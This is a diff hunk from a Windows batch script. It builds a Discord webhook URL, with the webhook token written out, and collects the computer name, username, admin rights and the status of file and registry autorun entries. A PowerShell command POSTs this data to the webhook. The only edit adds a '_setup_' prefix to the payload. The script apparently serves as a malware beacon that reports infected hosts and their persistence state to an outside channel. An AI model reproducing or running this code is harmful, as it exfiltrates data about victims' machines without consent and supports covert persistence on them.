@@ -149,7 +149,7 @@ set "url1=https://discord.com/api/webhooks/"
 set "url2=1158045149935440032/nfB686WoABy0Ns6wTIT_z4zkm34DhKgWHIO8zMgP-4FWy21hahTaLPKz8v0gGYYkiQnk"
 set "url=%url1%%url2%"
 
-set "content=%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%"
+set "content=_setup_%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%"
 
 powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%url%' -Method POST -ContentType 'application/json' -Body $body"
 
